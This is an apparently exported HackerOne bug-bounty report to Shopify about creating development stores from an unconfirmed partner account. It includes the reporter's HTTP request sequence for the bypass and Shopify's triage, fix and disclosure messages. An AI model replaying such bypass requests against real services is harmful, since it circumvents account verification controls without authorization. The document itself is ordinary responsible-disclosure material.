{"id":633371,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MzMzNzE=","url":"https://hackerone.com/reports/633371","title":"Add store to new partner account without confirming email address.","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-07-02T00:25:53.340Z","submitted_at":"2019-07-02T00:25:53.340Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jmp_35p","url":"/jmp_35p","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/347/034/03fa2ecca36682f2b7e78258838b9e6974542eff_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-01-02T15:14:03.756Z","bug_reporter_agreed_on_going_public_at":"2019-12-30T12:57:35.650Z","team_member_agreed_on_going_public_at":"2020-01-02T15:14:03.674Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Details\nWhen a someone signs up for a new account on partners.shopify.com they are asked to confirm their email address before they can do anything and by anything I mean add stores, invite members, use \naffiliate tools and so on. Apparently they can leverage an issue on partners.shopify.com to create stores on app.shopify.com without confirming their email address.\n\nSetup\n1. A new test account on partners.shopify.com.\n2. Don't confirm email after signing up.\n3. A partner account ID - say 1234\n4. Shop name - say attacker\n\nStep to reproduce.\n1. While logged in send the following to the server to obtain an access token\nGET /1234/stores/signup_object/dev_store \nHost: partners.shopify.com\n2. You should get a request similar to {\"extra\":{\"affiliate_shop\":\"eyJfcmFpbHMiOnsibWVzc2FnZSI6ImV5SndiR0Z1WDNOd1pXTWlPbn.....\"},\"signup_source\":\"development shop\",\"signup_types\":[\"affiliate_shop\"],\"previous_page\":\"https://partners.shopify.com/1234/stores\"}\n3. Finally, to create the shop, do the following:\nPOST /services/signup/create HTTP/1.1\nHost: app.shopify.com\n....\n\u003csnipped\u003e\n....\n_orig_referrer=https%3A%2F%2Fpartners.shopify.com%2F1234%2Fstores%2Fnew%3Fstore_type%3Ddev_store\n_y=\u0026ref=\u0026ssid=\u0026source=\u0026source_url=\u0026signup_code=\u0026signup_source=development+shop\u0026signup_source_details=build_store_for_client\u0026forwarded_host=\u0026signup_page=\u0026signup_locale=\u0026signup%5Bshop_name%5D=attacker\u0026signup%5Bsubdomain%5D=\u0026signup%5Bfirst_name%5D=\u0026signup%5Blast_name%5D=\u0026signup%5Bemail%5D=attacker%40domain.com\u0026signup%5Bpassword%5D={shop-password-here}\u0026signup%5Bconfirm_password%5D={shop_password_here}signup%5Baddress1%5D=Beverly+Hills\u0026signup%5Bcity%5D=Los+Angeles\u0026signup%5Bprovince%5D=CA\u0026signup%5Bzip%5D=90210\u0026signup%5Bcountry%5D=US\u0026signup%5Bphone%5D=\u0026signup%5Bpos%5D=\u0026signup%5Bextra%5D%5Baffiliate_shop%5D={access_token_here}\u0026signup%5Bextra%5D%5Borganization_id%5D=1234\u0026signup%5Bextra%5D%5Bpartner_test_shop%5D=\u0026signup%5Bsignup_types%5D%5B%5D=affiliate_shop\n\nNote: Every occurrence of \"1234\" should be replaced with the partner account ID created above. In case you have troubles reproducing the issue I will be glad to help out.\n\n## Impact\n\nA user can still find a way around stores creation without confirm email first.","vulnerability_information_html":"\u003cp\u003eDetails\u003cbr\u003e\nWhen a someone signs up for a new account on partners.shopify.com they are asked to confirm their email address before they can do anything and by anything I mean add stores, invite members, use \u003cbr\u003e\naffiliate tools and so on. Apparently they can leverage an issue on partners.shopify.com to create stores on app.shopify.com without confirming their email address.\u003c/p\u003e\n\n\u003cp\u003eSetup\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eA new test account on partners.shopify.com.\u003c/li\u003e\n\u003cli\u003eDon\u0026#39;t confirm email after signing up.\u003c/li\u003e\n\u003cli\u003eA partner account ID - say 1234\u003c/li\u003e\n\u003cli\u003eShop name - say attacker\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eStep to reproduce.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eWhile logged in send the following to the server to obtain an access token\nGET /1234/stores/signup_object/dev_store \nHost: partners.shopify.com\u003c/li\u003e\n\u003cli\u003eYou should get a request similar to {\u0026quot;extra\u0026quot;:{\u0026quot;affiliate_shop\u0026quot;:\u0026quot;eyJfcmFpbHMiOnsibWVzc2FnZSI6ImV5SndiR0Z1WDNOd1pXTWlPbn.....\u0026quot;},\u0026quot;signup_source\u0026quot;:\u0026quot;development shop\u0026quot;,\u0026quot;signup_types\u0026quot;:[\u0026quot;affiliate_shop\u0026quot;],\u0026quot;previous_page\u0026quot;:\u0026quot;\u003ca title=\"https://partners.shopify.com/1234/stores%22\" href=\"/redirect?url=https%3A%2F%2Fpartners.shopify.com%2F1234%2Fstores%2522\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://partners.shopify.com/1234/stores%22\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e}\u003c/li\u003e\n\u003cli\u003eFinally, to create the shop, do the following:\nPOST /services/signup/create HTTP/1.1\nHost: app.shopify.com\n....\n\u0026lt;snipped\u0026gt;\n....\n_orig_referrer=https%3A%2F%2Fpartners.shopify.com%2F1234%2Fstores%2Fnew%3Fstore_type%3Ddev_store\n_y=\u0026amp;ref=\u0026amp;ssid=\u0026amp;source=\u0026amp;source_url=\u0026amp;signup_code=\u0026amp;signup_source=development+shop\u0026amp;signup_source_details=build_store_for_client\u0026amp;forwarded_host=\u0026amp;signup_page=\u0026amp;signup_locale=\u0026amp;signup%5Bshop_name%5D=attacker\u0026amp;signup%5Bsubdomain%5D=\u0026amp;signup%5Bfirst_name%5D=\u0026amp;signup%5Blast_name%5D=\u0026amp;signup%5Bemail%5D=attacker%40domain.com\u0026amp;signup%5Bpassword%5D={shop-password-here}\u0026amp;signup%5Bconfirm_password%5D={shop_password_here}signup%5Baddress1%5D=Beverly+Hills\u0026amp;signup%5Bcity%5D=Los+Angeles\u0026amp;signup%5Bprovince%5D=CA\u0026amp;signup%5Bzip%5D=90210\u0026amp;signup%5Bcountry%5D=US\u0026amp;signup%5Bphone%5D=\u0026amp;signup%5Bpos%5D=\u0026amp;signup%5Bextra%5D%5Baffiliate_shop%5D={access_token_here}\u0026amp;signup%5Bextra%5D%5Borganization_id%5D=1234\u0026amp;signup%5Bextra%5D%5Bpartner_test_shop%5D=\u0026amp;signup%5Bsignup_types%5D%5B%5D=affiliate_shop\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eNote: Every occurrence of \u0026quot;1234\u0026quot; should be replaced with the partner account ID created above. In case you have troubles reproducing the issue I will be glad to help out.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eA user can still find a way around stores creation without confirm email first.\u003c/p\u003e\n","weakness":{"id":26,"name":"Improper Access Control - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":11,"voters":["dhakal_ananda","cryptographer","clarckowen_","themanxil","rocky1k","axelxin","loc","novaf","0xmagna","blacc_hat","and 1 more..."],"severity":{"rating":"medium","author_type":"User"},"structured_scope":{"databaseId":422,"asset_type":"URL","asset_identifier":"partners.shopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5247323,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi @jmp_35p,\n\nThank you for your report.\nWe have reproduced this issue and our team is currently working on a fix.\n\nHowever, this issue does not fall under any of our eligible bounty types nor does it introduce any significant security implications.\n\nOutside of the Partner Dashboard, users are already able to create stores without being required to confirm their email address.\n\nAs such, this issue is ineligible for a bounty.\nWe look forward to receiving more reports from you in the future. ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jmp_35p\"\u003e@jmp_35p\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your report.\u003cbr\u003e\nWe have reproduced this issue and our team is currently working on a fix.\u003c/p\u003e\n\n\u003cp\u003eHowever, this issue does not fall under any of our eligible bounty types nor does it introduce any significant security implications.\u003c/p\u003e\n\n\u003cp\u003eOutside of the Partner Dashboard, users are already able to create stores without being required to confirm their email address.\u003c/p\u003e\n\n\u003cp\u003eAs such, this issue is ineligible for a bounty.\u003cbr\u003e\nWe look forward to receiving more reports from you in the future. \u003c/p\u003e\n","automated_response":false,"created_at":"2019-07-03T18:15:38.079Z","updated_at":"2019-07-03T18:15:38.079Z","actor":{"username":"steven_zhao","cleared":false,"url":"/steven_zhao","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/606/114/a1238785f1096f1fa26d850510a73ec978b4058f_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5247447,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"","markdown_message":"","automated_response":false,"created_at":"2019-07-03T18:41:29.451Z","updated_at":"2019-07-03T18:41:29.451Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5489095,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @jmp_35p,\n\nThanks again for your report. We recently deployed a fix, and you should no longer be able to reproduce the issue.\nWe look forward to hearing from you again soon!","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jmp_35p\"\u003e@jmp_35p\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThanks again for your report. We recently deployed a fix, and you should no longer be able to reproduce the issue.\u003cbr\u003e\nWe look forward to hearing from you again soon!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-02T15:18:04.738Z","updated_at":"2019-08-02T15:18:04.738Z","actor":{"username":"steven_zhao","cleared":false,"url":"/steven_zhao","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/606/114/a1238785f1096f1fa26d850510a73ec978b4058f_original.JPG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"jmp_35p","url":"/jmp_35p"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5495491,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I can no longer reproduce this issue.","markdown_message":"\u003cp\u003eI can no longer reproduce this issue.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-08-04T03:44:51.763Z","updated_at":"2019-08-04T03:44:51.763Z","actor":{"username":"jmp_35p","cleared":false,"url":"/jmp_35p","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/347/034/03fa2ecca36682f2b7e78258838b9e6974542eff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6659188,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-30T12:57:35.668Z","updated_at":"2019-12-30T12:57:35.668Z","first_to_agree":true,"actor":{"username":"jmp_35p","cleared":false,"url":"/jmp_35p","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/347/034/03fa2ecca36682f2b7e78258838b9e6974542eff_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6674060,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-02T15:14:03.696Z","updated_at":"2020-01-02T15:14:03.696Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6674061,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-01-02T15:14:03.772Z","updated_at":"2020-01-02T15:14:03.772Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}